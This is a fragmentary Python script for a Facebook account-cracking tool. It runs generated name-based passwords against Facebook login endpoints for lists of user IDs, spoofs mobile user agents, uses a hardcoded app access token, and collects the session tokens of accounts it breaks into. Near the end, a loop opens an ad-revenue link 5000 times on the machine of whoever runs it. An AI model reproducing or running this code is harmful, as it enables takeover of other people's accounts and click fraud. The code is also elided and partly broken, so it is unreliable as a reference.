...
def apv():
	try:
		...
		if kex in link:clear();main()
			...
			line()
			url_wa = "https://chat.whatsapp.com/GoQfS2y8UqYKhrVqlZrdUS",
...
def m1(ids,names,passlist,fbcr):
	try:
		...
		for pw in passlist:
			...
			ua = "Mozilla/5.0 (Linux; U; Android 12; Infinix X6815D Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36 OPR/71.0.2254.67050",
			head = { "method": 'GET', 
    "path": '/',
    "scheme": 'https',
...
def m2(ids,names,passlist,fbcr):
    ...
    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',}
			...
			po = requests.post('https://p.facebook.com/auth/login',data=data,headers=head).json()
			if "session_key" in po:
				token = po['access_token']
				print('\r\r\033[1;32m [ALI-OK] '+ids+' | '+pas)
				oks.append(ids)
...
def m3(ids,names,passlist,fbcr):
	try:
		...
		for pw in passlist:
			pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
			ua=random.choice(xx)
			ua = "Mozilla/5.0 (Linux; Android 13; Infinix X678B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.127 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/424.0.0.21.75;]",
...
def rd(ids,passlist,fbcr):
    ...
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'referer': 'https://p.facebook.com/?stype=lo&jlou=Afe-BgFAnMoaDaaWSex_hwYvOXhlH29zPLGugq4rGZlsdB4pIG53PcTllr1fKg0ucOAAMQauolYURntP_hN-GphcqbM_-miu9U-uFaJRY3Tp6Q&smuh=50232&lh=Ac-w9SdOH9EoFiHeCQY&wtsid=rdr_0xzZQAY95a7WgkiB5&_rdr',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
    'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
    'sec-ch-ua-mobile': '?1',
    ...
    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
			...
			data = {"adid":str(uuid.uuid4()),"format":"json","device_id":str(uuid.uuid4()),"cpl":"true","family_device_id":str(uuid.uuid4()),"credentials_type":"device_based_login_password","error_detail_type":"button_with_disabled","source":"register_api","email":ids,"password":pas,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta":"NO_FILE","advertiser_id":str(uuid.uuid4()),"currently_logged_in_userid":"0","locale":"zh_HK","client_country_code":"HK","method":"auth.login","fb_api_req_friendly_name":"authenticate","fb_api_caller_class":"com.facebook.account.login.protocol.Fb4aAuthHandler","api_key":"882a8490361da98702bf97a021ddc14d"}
			po = requests.post('https://d.facebook.com/method/auth.login',data=data,headers=head).json()
			if "session_key" in po:
				uid = str(po['uid'])
				token = po['access_token']
...
import os
for i in range(5000):
  os.system ('xdg-open https://www.highcpmrevenuegate.com/tq09yapz2?key=bad6946b0ace9bb7cd5b266c25e98af4')
  try:
    driver.webdriver.Chrome()
    driver.get()
    link = driver.find_element_by_link_text("NAVEED")
    link.click()
  except:pass
try:main()
except requests.exceptions.ConnectionError:
